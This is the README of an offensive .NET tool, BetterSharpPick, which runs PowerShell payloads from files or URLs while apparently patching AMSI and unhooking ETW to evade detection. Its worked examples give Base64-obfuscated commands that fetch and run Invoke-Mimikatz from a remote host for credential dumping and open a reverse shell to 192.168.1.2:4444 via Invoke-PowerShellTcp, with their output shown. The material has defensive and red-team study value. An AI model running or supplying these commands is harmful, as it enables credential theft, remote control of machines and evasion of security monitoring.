# BetterSharpPick

BetterSharpPick is a .NET tool that runs PowerShell code **without calling `powershell.exe` directly**. 

> Legal & Ethical Use
> 
> 
> Use only on systems you own or are explicitly authorized to test. Unauthorized use is illegal. You are responsible for complying with all laws and policies.
> 

## Features

- Execute payloads from a **local file** or **URL** (`path`)
- Execute **inline PowerShell** (`c`)
- **Scoped Base64 decoding** with `b64` (applies only to the next option you put it in front of)
- **Single-byte XOR decoding for file/URL payloads only** (`xor <0-255>`)
- Optional TLS protocol configuration

## Usage

```bash
BetterSharpPick.exe [options]
```

### Options

- `path <path|url>`
    
    Path or URL of the PowerShell payload. If `-xor` is provided, XOR decoding is applied **only** to this file/URL content.
    
- `c <command>`
    
    Inline PowerShell code to execute.
    
- `-arg <string>`
    
    Argument(s) to pass through to the payload/command. Repeatable.
    
- `b64` *(scoped)*
    
    Indicates that the **next option’s value** is Base64-encoded and must be decoded.
    
    Put `-b64` **immediately before** each option whose value is Base64.
    
- `xor <0-255>`
    
    Single decimal byte key. **Applies only to `-path` payloads** (files/URLs). **Does not** apply to `-c` or `-arg`.

- `raw`
    
    Treat -path payload as raw (no Base64/XOR).

### Decoding rules

- **Scope of `b64`:**
    - `b64` affects **only the option right after it** (and that option’s single value).
    
    If you need multiple values decoded, repeat `-b64` before each one.
    
- **Scope of `xor`:**
    - `xor` affects **only** the payload read via `path` (file/URL). It does **not** touch `c` or `-arg`.

- **Scope of `raw`:**
    - `raw` guarantees the -path content is treated as raw; no Base64/XOR is applied.

- **Order when both apply to `path`:**
    
    If you place `-b64` **and** also supply `-xor`, decoding proceeds as: **Base64 decode → XOR decode** of the payload bytes.
    

## Examples (safe, illustrative)

Run a local payload:

    BetterSharpPick.exe -path .\script.ps1

Run a payload from URL:

    BetterSharpPick.exe -path https://example.com/payload.ps1

Run an inline command:

    BetterSharpPick.exe -c "Get-Process | Select-Object -First 5"

Run mimikatz:

    BetterSharpPick.exe -b64 -path aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcvcmVmcy9oZWFkcy9tYXN0ZXIvR2F0aGVyL0ludm9rZS1NaW1pa2F0ei5wczE= -arg     SW52b2tlLU1pbWlrYXR6IC1Db21tYW5kICJjb2ZmZWUgZXhpdCI= -raw
    [+] ~MustafaNafizDurukan #BetterSharpPick
    [+] URL/PATH : https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Gather/Invoke-Mimikatz.ps1
    [+] Argument : Invoke-Mimikatz -Command "coffee exit"
    [+] Successfully unhooked ETW!
    [+] Successfully patched AMSI!
    
      .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11
     .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
     ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
     '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
      '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
    
    mimikatz(powershell) # coffee
    
        ( (
         ) )
      .______.
      |      |]
      \      /
       `----'
    
    mimikatz(powershell) # exit
    Bye!

Base64-encoded **inline** command (scope `-b64` to `-c`):

    BetterSharpPick.exe -b64 -c V3JpdGUtSG9zdCAnSGVsbG8gV29ybGQn
    [+] ~MustafaNafizDurukan #BetterSharpPick
    [+] Command : Write-Host 'Hello World'
    [+] Successfully unhooked ETW!
    [+] Successfully patched AMSI!
    Hello World

Base64-encoded **argument** (scope `-b64` to each `-arg` you want decoded):

    BetterSharpPick.exe -b64 -path aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcvbWFzdGVyL1NoZWxscy9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczE= -arg SW52b2tlLVBvd2VyU2hlbGxUY3AgLVJldmVyc2UgLUlQQWRkcmVzcyAxOTIuMTY4LjEuMiAtUG9ydCA0NDQ0 -raw
    [+] ~MustafaNafizDurukan #BetterSharpPick
    [+] URL/PATH : https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
    [+] Argument : Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.2 -Port 4444
    [+] Successfully unhooked ETW!
    [+] Successfully patched AMSI!

Base64 on the **payload** + XOR on the **payload** (XOR applies only to `-path`):

    # -b64 only scopes to -path; XOR applies to the decoded file/URL payload
    BetterSharpPick.exe -xor 140 -b64 -path aHR0cHM6Ly9leGFtcGxlLmNvbS9wYXlsb2FkLnBzMQ==

No Base64 anywhere if `-b64` is not placed before an option:

    BetterSharpPick.exe -path .\plain.ps1 -arg simple

## Built-in Help (CLI)

```
USAGE:
  BetterSharpPick [-xor <0-255>] [-path <file-or-url>] [-c <text>] [-arg <string>] [-b64] [-raw]

DESCRIPTION:
  -path <value>   : Payload file path or URL.
  -c <value>      : Inline PowerShell code.
  -arg <string>   : Argument to pass (repeatable).

  -b64            : Scoped base64. Applies ONLY to the NEXT option’s value.
                    Put -b64 directly before -path, -c, or -arg if that value is base64-encoded.
                    If -b64 is not used in front of an option, no base64 is expected for that option.

  -xor <0-255>    : Single decimal byte key. Applies ONLY to payloads from -path (file/URL).
                    Does NOT apply to -c or -arg.
                    If used together with -b64 (scoped to -path), decoding order is: Base64 → XOR.
  
  -raw            : Affects only the payload content read via -path.
                    Treat the -path payload as RAW text; Do NOT apply Base64/XOR.
                    Does not affect -c or -arg.

EXAMPLES:
  BetterSharpPick -path https://example.com/file.ps1
  BetterSharpPick -b64 -c V3JpdGUtSG9zdCAnSGVsbG8n
  BetterSharpPick -b64 -arg UGFyYW0x -b64 -arg UGFyYW0y
  BetterSharpPick -xor 140 -b64 -path aHR0cHM6Ly9leGFtcGxlLmNvbS9maWxlLnBzMQ==
```

## License

Released under the **BSD 3-Clause License**.

## Credits

Inspired by and adapted from [TheKevinWang/SharpPick](https://github.com/TheKevinWang/SharpPick).